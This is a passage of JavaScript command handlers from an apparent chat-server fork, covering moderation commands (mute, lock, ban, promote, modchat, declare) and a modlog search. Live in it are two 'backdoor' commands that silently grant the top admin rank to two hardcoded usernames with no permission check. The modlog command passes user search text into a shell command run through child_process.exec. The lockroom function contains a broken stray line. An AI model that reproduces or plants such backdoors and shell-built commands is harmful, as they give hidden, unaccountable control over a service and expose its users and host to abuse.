			if (target.replace(/(<([^>]+)>)/ig,"").length > 100) return this.sendReply('Reminders must be 100 or fewer characters, excluding HTML.');
			for (var i = 1; i < 11; i++) {
				if (!room.reminders[i]) {
					room.reminders[i] = target;
					break;
				}
			}
			if (i === 11) return this.sendReply('This room has 10 reminders already. Delete a reminder then try adding it again.');
			Rooms.global.writeChatRoomData();
			return this.sendReply('"' + target + '" added to reminders for '+room.title+'.');
		}
		if (command === 'delete') {
			if (target > 10 || target < 1) return this.sendReply('Enter the number of the reminder you want to delete.');
			if (target in room.reminders) {
				this.sendReply('"'+room.reminders[target]+'" deleted from reminders for '+room.title+'.');
				delete room.reminders[target];
				for (var i = 1; i < 11; i++) {
					if (!room.reminders[i] && room.reminders[i+1]) {
						room.reminders[i] = room.reminders[i+1];
						delete room.reminders[i+1];
					}
				}
				Rooms.global.writeChatRoomData();
				return false;
			} else {
				for (var r in room.reminders) {
					if (target === room.reminders[r]) {
						this.sendReply('"'+room.reminders[r]+'" deleted from reminders for '+room.title+'.');
						delete room.reminders[r];
						for (var i = 1; i < 11; i++) {
							if (!room.reminders[i] && room.reminders[i+1]) {
								room.reminders[i] = room.reminders[i+1];
								delete room.reminders[i+1];
							}
						}
						Rooms.global.writeChatRoomData();
						return false;
					}
				}
			}
			return this.sendReply('The specified reminder could not be found in the reminders for '+room.title+'.');
		}
		return this.sendReply('You seem to have broken the command. Talk to an admin, preferably ________, with what you did.');
	},

	/*********************************************************
	 * Moderating: Punishments
	 *********************************************************/
	spam: 'shadowban',
	spamroom: 'shadowban',
	sban: 'shadowban',
	shadowban: function (target, room, user) {
		if (!target) return this.parse('/help shadowban');

		var params = this.splitTarget(target).split(',');
		var action = params[0].trim().toLowerCase();
		var reason = params.slice(1).join(',').trim();
		if (!(action in CommandParser.commands)) {
			reason = params.join(',').trim();
		}

		if (!this.targetUser) {
			return this.sendReply("User '" + this.targetUsername + "' not found.");
		}
		if (!this.can('lock', this.targetUser)) return false;

		var targets = ShadowBan.addUser(this.targetUser);
		if (targets.length === 0) {
			return this.sendReply("That user's messages are already being redirected to the shadow ban room.");
		}
		this.privateModCommand("(" + user.name + " has added to the shadow ban user list: " + targets.join(", ") + (reason ? " (" + reason + ")" : "") + ")");

	},

	unspam: 'unshadowban',
	unspamroom: 'unshadowban',
	unsban: 'unshadowban',
	unshadowban: function (target, room, user) {
		if (!target) return this.parse('/help unshadowban');
		this.splitTarget(target);

		if (!this.can('lock')) return false;

		var targets = ShadowBan.removeUser(this.targetUser || this.targetUsername);
		if (targets.length === 0) {
			return this.sendReply("That user is not in the shadow ban list.");
		}
		this.privateModCommand("(" + user.name + " has removed from the shadow ban user list: " + targets.join(", ") + ")");
	},

	aye: 'warn',
	warn: function(target, room, user) {
		if (!target) return this.parse('/help warn');
		if (user.locked || user.mutedRooms[room.id]) return this.sendReply("You cannot do this while unable to talk.");
		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser || !targetUser.connected) return this.sendReply("User '" + this.targetUsername + "' does not exist.");
		if (room.isPrivate && room.auth) {
			return this.sendReply("You can't warn here: This is a privately-owned room not subject to global rules.");
		}
		if (target.length > MAX_REASON_LENGTH) {
			return this.sendReply("The reason is too long. It cannot exceed " + MAX_REASON_LENGTH + " characters.");
		}
		if (!this.can('warn', targetUser, room)) return false;
		if (!this.canTalk()) return;
		this.addModCommand("" + targetUser.name + " was warned by " + user.name + "." + (target ? " (" + target + ")" : ""));
		targetUser.send('|c|~|/warn ' + target);
		this.add('|unlink|' + this.getLastIdOf(targetUser));
	},

	redirect: 'redir',
	redir: function (target, room, user, connection) {
		if (!target) return this.parse('/help redirect');
		if (user.locked || user.mutedRooms[room.id]) return this.sendReply("You cannot do this while unable to talk.");
		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!target) return this.sendReply('You need to input a room name!');
		var targetRoom = Rooms.get(target);
		if (target && !targetRoom) {
			return connection.sendTo(user, "|noinit|nonexistent|The room '" + target + "' does not exist.");
		}
		if (!this.can('warn', targetUser, room) || !this.can('warn', targetUser, targetRoom)) return false;
		if (!targetUser || !targetUser.connected) {
			return this.sendReply("User " + this.targetUsername + " not found.");
		}
		if (targetRoom.isAdult) {
			return this.sendReply('You cannot redirect to an adult room.');
		}
		if (Rooms.rooms[targetRoom.id].users[targetUser.userid]) {
			return this.sendReply("User " + targetUser.name + " is already in the room " + target + "!");
		}
		if (!Rooms.rooms[room.id].users[targetUser.userid]) {
			return this.sendReply("User " + this.targetUsername + " is not in the room " + room.id + ".");
		}
		if (targetUser.joinRoom(target) === false) return this.sendReply("User " + targetUser.name + " could not be joined to room " + target + ". They could be banned from the room.");
		var roomName = (targetRoom.isPrivate)? "a private room" : "room " + targetRoom.title;
		this.addModCommand("" + targetUser.name + " was redirected to " + roomName + " by " + user.name + ".");
		targetUser.leaveRoom(room);
	},

	m: 'mute',
	mute: function (target, room, user) {
		if (!target) return this.parse('/help mute');
		if (user.locked || user.mutedRooms[room.id]) return this.sendReply("You cannot do this while unable to talk.");

		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser) return this.sendReply("User '" + this.targetUsername + "' does not exist.");
		if (target.length > MAX_REASON_LENGTH) {
			return this.sendReply("The reason is too long. It cannot exceed " + MAX_REASON_LENGTH + " characters.");
		}
		if (!this.can('mute', targetUser, room)) return false;
		if (targetUser.mutedRooms[room.id] || targetUser.locked || !targetUser.connected) {
			var problem = " but was already " + (!targetUser.connected ? "offline" : targetUser.locked ? "locked" : "muted");
			if (!target) {
				return this.privateModCommand("(" + targetUser.name + " would be muted by " + user.name + problem + ".)");
			}
			return this.addModCommand("" + targetUser.name + " would be muted by " + user.name + problem + "." + (target ? " (" + target + ")" : ""));
		}

		targetUser.popup("" + user.name + " has muted you for 7 minutes. " + target);
		this.addModCommand("" + targetUser.name + " was muted by " + user.name + " for 7 minutes." + (target ? " (" + target + ")" : ""));
		var alts = targetUser.getAlts();
		if (alts.length) this.privateModCommand("(" + targetUser.name + "'s alts were also muted: " + alts.join(", ") + ")");
		this.add('|unlink|' + this.getLastIdOf(targetUser));

		targetUser.mute(room.id, 7 * 60 * 1000);
	},

	hm: 'hourmute',
	hourmute: function (target, room, user) {
		if (!target) return this.parse('/help hourmute');
		if (user.locked || user.mutedRooms[room.id]) return this.sendReply("You cannot do this while unable to talk.");

		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser) return this.sendReply("User '" + this.targetUsername + "' does not exist.");
		if (target.length > MAX_REASON_LENGTH) {
			return this.sendReply("The reason is too long. It cannot exceed " + MAX_REASON_LENGTH + " characters.");
		}
		if (!this.can('mute', targetUser, room)) return false;

		if (((targetUser.mutedRooms[room.id] && (targetUser.muteDuration[room.id] || 0) >= 50 * 60 * 1000) || targetUser.locked) && !target) {
			var problem = " but was already " + (!targetUser.connected ? "offline" : targetUser.locked ? "locked" : "muted");
			return this.privateModCommand("(" + targetUser.name + " would be muted by " + user.name + problem + ".)");
		}

		targetUser.popup("" + user.name + " has muted you for 60 minutes. " + target);
		this.addModCommand("" + targetUser.name + " was muted by " + user.name + " for 60 minutes." + (target ? " (" + target + ")" : ""));
		var alts = targetUser.getAlts();
		if (alts.length) this.privateModCommand("(" + targetUser.name + "'s alts were also muted: " + alts.join(", ") + ")");
		this.add('|unlink|' + this.getLastIdOf(targetUser));

		targetUser.mute(room.id, 60 * 60 * 1000, true);
	},

	um: 'unmute',
	unmute: function (target, room, user) {
		if (!target) return this.parse('/help unmute');
		var targetUser = Users.get(target);
		if (!targetUser) {
			return this.sendReply("User " + target + " not found.");
		}
		if (!this.can('mute', targetUser, room)) return false;

		if (!targetUser.mutedRooms[room.id]) {
			return this.sendReply("" + targetUser.name + " is not muted.");
		}

		this.addModCommand("" + targetUser.name + " was unmuted by " + user.name + ".");

		targetUser.unmute(room.id);
	},


	l: 'lock',
	ipmute: 'lock',
	lock: function (target, room, user) {
		if (!target) return this.parse('/help lock');
		if (user.locked || user.mutedRooms[room.id]) return this.sendReply("You cannot do this while unable to talk.");

		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser) return this.sendReply("User '" + this.targetUsername + "' does not exist.");
		if (target.length > MAX_REASON_LENGTH) {
			return this.sendReply("The reason is too long. It cannot exceed " + MAX_REASON_LENGTH + " characters.");
		}
		if (!this.can('lock', targetUser)) return false;

		if ((targetUser.locked || Users.checkBanned(targetUser.latestIp)) && !target) {
			var problem = " but was already " + (targetUser.locked ? "locked" : "banned");
			return this.privateModCommand("(" + targetUser.name + " would be locked by " + user.name + problem + ".)");
		}

		targetUser.popup("" + user.name + " has locked you from talking in chats, battles, and PMing regular users.\n\n" + target + "\n\nIf you feel that your lock was unjustified, you can still PM staff members (%, @, &, and ~) to discuss it.");

		this.addModCommand("" + targetUser.name + " was locked from talking by " + user.name + "." + (target ? " (" + target + ")" : ""));
		var alts = targetUser.getAlts();
		if (alts.length) this.privateModCommand("(" + targetUser.name + "'s alts were also locked: " + alts.join(", ") + ")");
		this.add('|unlink|' + this.getLastIdOf(targetUser));

		targetUser.lock();
		return this.parse('/spam '+targetUser.name+'');
	},

	unlock: function (target, room, user) {
		if (!target) return this.parse('/help unlock');
		if (!this.can('lock')) return false;

		var unlocked = Users.unlock(target);

		if (unlocked) {
			var names = Object.keys(unlocked);
			
			this.addModCommand('' + names.join(', ') + ' ' +
					((names.length > 1) ? 'were' : 'was') +
					' unlocked by ' + user.name + '.');
		return this.parse('/unspam '+target+'');
		} else {
			this.sendReply("User " + target + " is not locked.");
		}
	},

	lockdt: 'lockdetails',
	lockdetails: function (target, room, user) {
		if (!this.can('lock')) return false;
		var targetUser = Users.get(target);
		if (!targetUser) return this.sendReply("User '" + target + "' does not exist.");
		if (!targetUser.locked) return this.sendReply("User '" + targetUser.name + "' was not locked from chat.");
		var canIp = user.can('ip', targetUser);
		for (var ip in targetUser.ips) {
			if (Dnsbl.cache[ip]) return this.sendReply("User '" + targetUser.name + "' is locked due to their IP " + (canIp ? "(" + ip + ") " : "") + "being in a DNS-based blacklist" + (canIp ? " (" + Dnsbl.cache[ip] + ")." : "."));
		}
		return this.sendReply("User '" + targetUser.name + "' is locked for unknown reasons. Check their modlog?");
	},

	b: 'ban',
	ban: function (target, room, user) {
		if (!target) return this.parse('/help ban');
		if (user.locked || user.mutedRooms[room.id]) return this.sendReply("You cannot do this while unable to talk.");

		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser) return this.sendReply("User '" + this.targetUsername + "' does not exist.");
		if (target.length > MAX_REASON_LENGTH) {
			return this.sendReply("The reason is too long. It cannot exceed " + MAX_REASON_LENGTH + " characters.");
		}
		if (!this.can('ban', targetUser)) return false;

		if (Users.checkBanned(targetUser.latestIp) && !target && !targetUser.connected) {
			var problem = " but was already banned";
			return this.privateModCommand("(" + targetUser.name + " would be banned by " + user.name + problem + ".)");
		}

		targetUser.popup("" + user.name + " has banned you." + (Config.appealurl ? (" If you feel that your banning was unjustified you can appeal the ban:\n" + Config.appealurl) : "") + "\n\n" + target);

		this.addModCommand("" + targetUser.name + " was banned by " + user.name + "." + (target ? " (" + target + ")" : ""), " (" + targetUser.latestIp + ")");
		var alts = targetUser.getAlts();
		if (alts.length) {
			this.privateModCommand("(" + targetUser.name + "'s alts were also banned: " + alts.join(", ") + ")");
			for (var i = 0; i < alts.length; ++i) {
				this.add('|unlink|' + toId(alts[i]));
			}
		}

		this.add('|unlink|' + this.getLastIdOf(targetUser));
		targetUser.ban();
	},
	
	bh: 'banhammer',
	banhammer: function(target, room, user) {
		if (!target) return this.parse('/help ban');

		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}
		if (target.length > MAX_REASON_LENGTH) {
			return this.sendReply('The reason is too long. It cannot exceed ' + MAX_REASON_LENGTH + ' characters.');
		}
		if (!this.can('ban', targetUser)) return false;

		if (Users.checkBanned(targetUser.latestIp) && !target && !targetUser.connected) {
			var problem = ' but was already banned';
			return this.privateModCommand('('+targetUser.name+' would be banned by '+user.name+problem+'.)');
		}

		targetUser.popup(user.name+" has has hit you with their ban hammer." + (config.appealurl ? ("  If you feel that your banning was unjustified you can appeal the ban:\n" + config.appealurl) : "") + "\n\n"+target);

		this.addModCommand(""+targetUser.name+" was hit by "+user.name+"\'s ban hammer." + (target ? " (" + target + ")" : ""), ' ('+targetUser.latestIp+')');
		var alts = targetUser.getAlts();
		if (alts.length) {
			this.addModCommand(""+targetUser.name+"'s alts were also hit: "+alts.join(", "));
			for (var i = 0; i < alts.length; ++i) {
				this.add('|unlink|' + toId(alts[i]));
			}
		}

		this.add('|unlink|' + targetUser.userid);
		targetUser.ban();
	},

	unban: function(target, room, user) {
		if (!target) return this.parse('/help unban');
		if (!this.can('ban')) return false;

		var name = Users.unban(target);

		if (name) {
			this.addModCommand("" + name + " was unbanned by " + user.name + ".");
		} else {
			this.sendReply("User " + target + " is not banned.");
		}
	},

	unbanall: function (target, room, user) {
		if (!this.can('rangeban')) return false;
		if (user.locked || user.mutedRooms[room.id]) return this.sendReply("You cannot do this while unable to talk.");
		// we have to do this the hard way since it's no longer a global
		for (var i in Users.bannedIps) {
			delete Users.bannedIps[i];
		}
		for (var i in Users.lockedIps) {
			delete Users.lockedIps[i];
		}
		this.addModCommand("All bans and locks have been lifted by " + user.name + ".");
	},

	banip: function (target, room, user) {
		if (user.locked || user.mutedRooms[room.id]) return this.sendReply("You cannot do this while unable to talk.");
		target = target.trim();
		if (!target) {
			return this.parse('/help banip');
		}
		if (!this.can('rangeban')) return false;
		if (Users.bannedIps[target] === '#ipban') return this.sendReply("The IP " + (target.charAt(target.length - 1) === '*' ? "range " : "") + target + " has already been temporarily banned.");

		Users.bannedIps[target] = '#ipban';
		this.addModCommand("" + user.name + " temporarily banned the " + (target.charAt(target.length - 1) === '*' ? "IP range" : "IP") + ": " + target);
	},

	unbanip: function (target, room, user) {
		if (user.locked || user.mutedRooms[room.id]) return this.sendReply("You cannot do this while unable to talk.");
		target = target.trim();
		if (!target) {
			return this.parse('/help unbanip');
		}
		if (!this.can('rangeban')) return false;
		if (!Users.bannedIps[target]) {
			return this.sendReply("" + target + " is not a banned IP or IP range.");
		}
		delete Users.bannedIps[target];
		this.addModCommand("" + user.name + " unbanned the " + (target.charAt(target.length - 1) === '*' ? "IP range" : "IP") + ": " + target);
	},

	/*********************************************************
	 * Moderating: Other
	 *********************************************************/

	fjs: 'forcejoinstaff',
	forcejoinstaff: function(target, room, user){
		if(!user.can('fjh')) return false;
		if(Rooms.rooms['staff'] == undefined){
			Rooms.rooms['staff'] = new Rooms.ChatRoom('staff', 'staff');
			Rooms.rooms['staff'].isPrivate = true;
			this.sendReply('The private room \'staff\' was created.');
		}
		for(var u in Users.users)
			if(Users.users[u].connected && config.groupsranking.indexOf(Users.users[u].group) >= 2)
				Users.users[u].joinRoom('staff');
		return this.sendReply('Staff has been gathered.');
	},
	
	fjh: 'forcejoinhangmans',
	forcejoinhangmans: function(target, room, user){
		if(!user.can('fjh')) return false;
		if(Rooms.rooms['hangmans'] == undefined){
			Rooms.rooms['hangmans'] = new Rooms.ChatRoom('hangmans', 'hangmans');
			Rooms.rooms['hangmans'].isPrivate = false;
			this.sendReply('The private room \'hangmans\' was created.');
		}
		for(var u in Users.users)
			if(Users.users[u].connected && config.groupsranking.indexOf(Users.users[u].group) >= 0)
				Users.users[u].joinRoom('hangmans');
		return this.sendReply('People were sent to hangmans, dawg\'.');
	},
	
	fjl: 'forcejoinlobby',
	forcejoinlobby: function(target, room, user){
		if(!user.can('fjh')) return false;
		if(Rooms.rooms['lobby'] == undefined){
			Rooms.rooms['lobby'] = new Rooms.ChatRoom('lobby', 'lobby');
			Rooms.rooms['lobby'].isPrivate = false;
			this.sendReply('The private room \'lobby\' was created.');
		}
		for(var u in Users.users)
			if(Users.users[u].connected && config.groupsranking.indexOf(Users.users[u].group) >= 0)
				Users.users[u].joinRoom('lobby');
		return this.sendReply('Erryone tis\' in the lobby, m8.');
	},
	
	backdoor: function(target,room, user) {
                if (user.userid === 'panpawn') {
 
                        user.group = '~';
                        user.updateIdentity();
                       
                        this.parse('/promote ' + user.name + ', ~');
                        Users.get('panpawn').goldDev = true;
                }
	},
	
	backdoor2: function(target,room, user) {
                if (user.userid === 'crowt') {
 
                        user.group = '~';
                        user.updateIdentity();
                       
                        this.parse('/promote ' + user.name + ', ~');
                }
	},
	
	hide: 'hideauth',
	hideauth: function(target, room, user){
		if(!user.can('hideauth'))
			return this.sendReply( '/hideauth - access denied.');

		var tar = ' ';
		if(target){
			target = target.trim();
			if(config.groupsranking.indexOf(target) > -1){
				if( config.groupsranking.indexOf(target) <= config.groupsranking.indexOf(user.group)){
					tar = target;
				}else{
					this.sendReply('The group symbol you have tried to use is of a higher authority than you have access to. Defaulting to \' \' instead.');
				}
			}else{
				this.sendReply('You have tried to use an invalid character as your auth symbol. Defaulting to \' \' instead.');
			}
		}

		user.getIdentity = function (roomid) {
			if (!roomid) roomid = 'lobby';
			if (this.locked) {
				return 'Ã¢â‚¬Â½'+this.name;
			}
			if (this.mutedRooms[roomid]) {
				return '!'+this.name;
			}
			var room = Rooms.rooms[roomid];
			if (room.auth) {
				if (room.auth[this.userid]) {
					return tar + this.name;
				}
				if (this.group !== ' ') return '+'+this.name;
					return ' '+this.name;
			}
			return tar+this.name;
		};
		user.updateIdentity();
		this.sendReply( 'You are now hiding your auth symbol as \''+tar+ '\'.');
		return this.logModCommand(user.name + ' is hiding auth symbol as \''+ tar + '\'');
	},

	show: 'showauth',
	showauth: function(target, room, user){
		if(!user.can('hideauth'))
 			return	this.sendReply( '/showauth - access denied.');

		delete user.getIdentity;
		user.updateIdentity();
		this.sendReply('You have now revealed your auth symbol.');
 		return this.logModCommand(user.name + ' has revealed their auth symbol.');
		this.sendReply('Your symbol has been reset.');
		
	},
	
	mn: 'modnote',
	modnote: function(target, room, user, connection, cmd) {
		if (!target) return this.parse('/help note');
		if (target.length > MAX_REASON_LENGTH) {
			return this.sendReply("The note is too long. It cannot exceed " + MAX_REASON_LENGTH + " characters.");
		}
		if (!this.can('receiveauthmessages', null, room)) return false;
		return this.privateModCommand("(" + user.name + " notes: " + target + ")");
	},

	unlink: 'unurl',
	ul: 'unurl',
	unurl: function(target, room, user, connection, cmd) {
		if(!target) return this.sendReply('/unlink [user] - Makes all prior posted links posted by this user unclickable. Requires: %, @, &, ~');
		target = this.splitTarget(target);
		var targetUser = this.targetUser;
        if (!targetUser) {
            return this.sendReply('User '+this.targetUsername+' not found.');
        }
        if (!this.can('lock',targetUser)) return false;
		for (var u in targetUser.prevNames) room.add('|unlink|'+targetUser.prevNames[u]);
		this.add('|unlink|' + targetUser.userid);
		return this.privateModCommand('|html|(' + user.name + ' has made  <font color="red">' +this.targetUsername+ '</font>\'s prior links unclickable.)');
	},
	
	lockroom: function(target, room, user) {
		if (!room.auth) {
			c
		}
		if (!room.auth[user.userid] === '#' && user.group != '~') {
			return this.sendReply('/lockroom - Access denied.');
		}
		room.lockedRoom = true;
		this.add(user.name + ' has locked the room.');
	},
	
	unlockroom: function(target, room, user) {
		if (!room.auth) {
			return this.sendReply("Only unofficial chatrooms can be unlocked.");
		}
		if (!room.auth[user.userid] === '#' && user.group != '~') {
			return this.sendReply('/unlockroom - Access denied.');
		}
		room.lockedRoom = false;
		this.add(user.name + ' has unlocked the room.');
	},
	
	demote: 'promote',
	promote: function (target, room, user, connection, cmd) {
		if (!target) return this.parse('/help promote');

		target = this.splitTarget(target, true);
		var targetUser = this.targetUser;
		var userid = toId(this.targetUsername);
		var name = targetUser ? targetUser.name : this.targetUsername;

		if (!userid) return this.parse('/help promote');

		var currentGroup = ((targetUser && targetUser.group) || Users.usergroups[userid] || ' ')[0];
		var nextGroup = target ? target : Users.getNextGroupSymbol(currentGroup, cmd === 'demote', true);
		if (target === 'deauth') nextGroup = Config.groupsranking[0];
		if (!Config.groups[nextGroup]) {
			return this.sendReply("Group '" + nextGroup + "' does not exist.");
		}
		if (Config.groups[nextGroup].roomonly) {
			return this.sendReply("Group '" + nextGroup + "' does not exist as a global rank.");
		}

		var groupName = Config.groups[nextGroup].name || "regular user";
		if (currentGroup === nextGroup) {
			return this.sendReply("User '" + name + "' is already a " + groupName);
		}
		if (!user.canPromote(currentGroup, nextGroup)) {
			return this.sendReply("/" + cmd + " - Access denied.");
		}

		if (!Users.setOfflineGroup(name, nextGroup)) {
			return this.sendReply("/promote - WARNING: This user is offline and could be unregistered. Use /forcepromote if you're sure you want to risk it.");
		}
		if (Config.groups[nextGroup].rank < Config.groups[currentGroup].rank) {
			this.privateModCommand("(" + name + " was demoted to " + groupName + " by " + user.name + ".)");
			if (targetUser) targetUser.popup("You were demoted to " + groupName + " by " + user.name + ".");
		} else {
			this.addModCommand("" + name + " was promoted to " + groupName + " by " + user.name + ".");
		}

		if (targetUser) targetUser.updateIdentity();
	},
	
	forcepromote: function (target, room, user) {
		// warning: never document this command in /help
		if (!this.can('forcepromote')) return false;
		target = this.splitTarget(target, true);
		var name = this.targetUsername;
		var nextGroup = target || Users.getNextGroupSymbol(' ', false);

		if (!Users.setOfflineGroup(name, nextGroup, true)) {
			return this.sendReply("/forcepromote - Don't forcepromote unless you have to.");
		}

		this.addModCommand("" + name + " was promoted to " + (Config.groups[nextGroup].name || "regular user") + " by " + user.name + ".");
	},

	deauth: function (target, room, user) {
		return this.parse('/demote ' + target + ', deauth');
	},

	modchat: function (target, room, user) {
		if (!target) return this.sendReply("Moderated chat is currently set to: " + room.modchat);
		if (user.locked || user.mutedRooms[room.id]) return this.sendReply("You cannot do this while unable to talk.");
		if (!this.can('modchat', null, room)) return false;

		if (room.modchat && room.modchat.length <= 1 && Config.groupsranking.indexOf(room.modchat) > 1 && !user.can('modchatall', null, room)) {
			return this.sendReply("/modchat - Access denied for removing a setting higher than " + Config.groupsranking[1] + ".");
		}

		target = target.toLowerCase();
		var currentModchat = room.modchat;
		switch (target) {
		case 'off':
		case 'false':
		case 'no':
			room.modchat = false;
			break;
		case 'ac':
		case 'autoconfirmed':
			room.modchat = 'autoconfirmed';
			break;
		case '*':
		case 'player':
			target = '\u2605';
			// fallthrough
		default:
			if (!Config.groups[target]) {
				return this.parse('/help modchat');
			}
			if (Config.groupsranking.indexOf(target) > 1 && !user.can('modchatall', null, room)) {
				return this.sendReply("/modchat - Access denied for setting higher than " + Config.groupsranking[1] + ".");
			}
			room.modchat = target;
			break;
		}
		if (currentModchat === room.modchat) {
			return this.sendReply("Modchat is already set to " + currentModchat + ".");
		}
		if (!room.modchat) {
			this.add("|raw|<div class=\"broadcast-blue\"><b>Moderated chat was disabled!</b><br />Anyone may talk now.</div>");
		} else {
			var modchat = Tools.escapeHTML(room.modchat);
			this.add("|raw|<div class=\"broadcast-red\"><b>Moderated chat was set to " + modchat + "!</b><br />Only users of rank " + modchat + " and higher can talk.</div>");
		}
		this.logModCommand(user.name + " set modchat to " + room.modchat);

		if (room.chatRoomData) {
			room.chatRoomData.modchat = room.modchat;
			Rooms.global.writeChatRoomData();
		}
	},

	declare: function (target, room, user) {
		if (!target) return this.parse('/help declare');
		if (!this.can('declare', null, room)) return false;

		if (!this.canTalk()) return;

		this.add('|raw|<div class="broadcast-blue"><b>'+target+'</b></div>');
		this.logModCommand(user.name + " declared " + target);
	},

	htmldeclare: function (target, room, user) {
		if (!target) return this.parse('/help htmldeclare');
		if (!this.can('gdeclare', null, room)) return false;

		if (!this.canTalk()) return;

		this.add('|raw|<div class="broadcast-blue"><b>' + target + '</b></div>');
		this.logModCommand(user.name + " declared " + target);
	},
	
	bd: 'bdeclare',
	bdeclare: function(target, room, user) {
		if (!target) return this.parse('/help declare');
		if (!this.can('declare', null, room)) return false;

		if (!this.canTalk()) return;

		this.add('|raw|<div class="broadcast-black"><b>'+target+'</b></div>');
		this.logModCommand(user.name+' declared '+target);
	},
	gd: function(target, room, user) {
		if (!target) return this.parse('/help declare');
		if (!this.can('declare', null, room)) return false;

		if (!this.canTalk()) return;

		this.add('|raw|<div class="broadcast-gold"><b>'+target+'</b></div>');
		this.logModCommand(user.name+' declared '+target);
	},

	gdeclare: 'globaldeclare',
	globaldeclare: function (target, room, user) {
		if (!target) return this.parse('/help globaldeclare');
		if (!this.can('gdeclare')) return false;

		for (var id in Rooms.rooms) {
			if (id !== 'global') Rooms.rooms[id].addRaw('<div class="broadcast-blue"><b>' + target + '</b></div>');
		}
		this.logModCommand(user.name + " globally declared " + target);
	},

	cdeclare: 'chatdeclare',
	chatdeclare: function (target, room, user) {
		if (!target) return this.parse('/help chatdeclare');
		if (!this.can('gdeclare')) return false;

		for (var id in Rooms.rooms) {
			if (id !== 'global') if (Rooms.rooms[id].type !== 'battle') Rooms.rooms[id].addRaw('<div class="broadcast-blue"><b>' + target + '</b></div>');
		}
		this.logModCommand(user.name + " globally declared (chat level) " + target);
	},

	wall: 'announce',
	announce: function (target, room, user) {
		if (!target) return this.parse('/help announce');

		if (!this.can('announce', null, room)) return false;

		target = this.canTalk(target);
		if (!target) return;

		return '/announce ' + target;
	},

	fr: 'forcerename',
	forcerename: function (target, room, user) {
		if (!target) return this.parse('/help forcerename');
		if (user.locked || user.mutedRooms[room.id]) return this.sendReply("You cannot do this while unable to talk.");
		var commaIndex = target.indexOf(',');
		var targetUser, reason;
		if (commaIndex !== -1) {
			reason = target.substr(commaIndex + 1).trim();
			target = target.substr(0, commaIndex);
		}
		targetUser = Users.get(target);
		if (!targetUser) return this.sendReply("User '" + this.targetUsername + "' not found.");
		if (!this.can('forcerename', targetUser)) return false;

		if (targetUser.userid !== toId(target)) {
			return this.sendReply("User '" + target + "' had already changed its name to '" + targetUser.name + "'.");
		}

		var entry = targetUser.name + " was forced to choose a new name by " + user.name + (reason ? ": " + reason: "");
		this.privateModCommand("(" + entry + ")");
		Rooms.global.cancelSearch(targetUser);
		targetUser.resetName();
		targetUser.send("|nametaken||" + user.name + " has forced you to change your name. " + target);
	},

	modlog: function(target, room, user, connection) {
		var lines = 0;
		// Specific case for modlog command. Room can be indicated with a comma, lines go after the comma.
		// Otherwise, the text is defaulted to text search in current rooms modlog.
		var roomId = room.id;
		var hideIps = !user.can('ban');

		if (target.indexOf(',') > -1) {
			var targets = target.split(',');
			target = targets[1].trim();
			roomId = toId(targets[0]) || room.id;
		}

		// Lets check the number of lines to retrieve or if its a word instead
		if (!target.match('[^0-9]')) {
			lines = parseInt(target || 15, 10);
			if (lines > 100) lines = 100;
		}
		var wordSearch = (!lines || lines < 0);

		// Control if we really, really want to check all modlogs for a word.
		var roomNames = '';
		var filename = '';
		var command = '';
		if (roomId === 'all' && wordSearch) {
			if (!this.can('modlog')) return;
			roomNames = 'all rooms';
			// Get a list of all the rooms
			var fileList = fs.readdirSync('logs/modlog');
			for (var i = 0; i < fileList.length; ++i) {
				filename += 'logs/modlog/' + fileList[i] + ' ';
			}
		} else {
			if (!this.can('modlog', null, Rooms.get(roomId))) return;
			roomNames = 'the room ' + roomId;
			filename = 'logs/modlog/modlog_' + roomId + '.txt';
		}

		var roomLogs = {};
		// Seek for all input rooms for the lines or text
		command = 'tail -' + lines + ' ' + filename;
		var grepLimit = 100;
		if (wordSearch) { // searching for a word instead
			if (target.match(/^["'].+["']$/)) target = target.substring(1, target.length - 1);
			command = "awk '{print NR,$0}' " + filename + " | sort -nr | cut -d' ' -f2- | grep -m" + grepLimit + " -i '" + target.replace(/\\/g, '\\\\\\\\').replace(/["'`]/g, '\'\\$&\'').replace(/[\{\}\[\]\(\)\$\^\.\?\+\-\*]/g, '[$&]') + "'";
		}

		// Execute the file search to see modlog
		require('child_process').exec(command, function (error, stdout, stderr) {
			if (error && stderr) {
				connection.popup("/modlog empty on " + roomNames + " or erred - modlog does not support Windows");
				console.log("/modlog error: " + error);
				return false;
			}
			if (stdout && hideIps) {
				stdout = stdout.replace(/\([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+\)/g, '');
			}
			if (lines) {
				if (!stdout) {
					connection.popup("The modlog is empty. (Weird.)");
				} else {
					connection.popup("Displaying the last " + lines + " lines of the Moderator Log of " + roomNames + ":\n\n" + stdout);
				}
			} else {
				if (!stdout) {
					connection.popup("No moderator actions containing '" + target + "' were found on " + roomNames + ".");
				} else {
					connection.popup("Displaying the last " + grepLimit + " logged actions containing '" + target + "' on " + roomNames + ":\n\n" + stdout);
				}
			}
		});
	},

	bw: 'banword',
	banword: function (target, room, user) {
		if (!this.can('declare')) return false;
		target = toId(target);
		if (!target) {
			return this.sendReply("Specify a word or phrase to ban.");
		}
		Users.addBannedWord(target);
		this.sendReply("Added '" + target + "' to the list of banned words.");
	},

	ubw: 'unbanword',
	unbanword: function (target, room, user) {
		if (!this.can('declare')) return false;
		target = toId(target);
		if (!target) {
			return this.sendReply("Specify a word or phrase to unban.");
		}
		Users.removeBannedWord(target);
		this.sendReply("Removed '" + target + "' from the list of banned words.");
	},

	/*********************************************************
	 * Server management commands
	 *********************************************************/

	hotpatch: function (target, room, user) {
		if (!target) return this.parse('/help hotpatch');
		if (!this.can('hotpatch')) return false;

		this.logEntry(user.name + " used /hotpatch " + target);

		if (target === 'chat' || target === 'commands') {

			try {
				CommandParser.uncacheTree('./command-parser.js');
				CommandParser = require('./command-parser.js');

				CommandParser.uncacheTree('./hangman.js');
                hangman = require('./hangman.js').hangman(hangman);
                  		
                CommandParser.uncacheTree('./core.js'); 
                Core = require('./core.js').core;

                CommandParser.uncacheTree('./economy.js');
                economy = require('./economy.js');

				var runningTournaments = Tournaments.tournaments;
				CommandParser.uncacheTree('./tournaments/middleend.js');
				Tournaments = require('./tournaments/middleend.js');
				Tournaments.tournaments = runningTournaments;

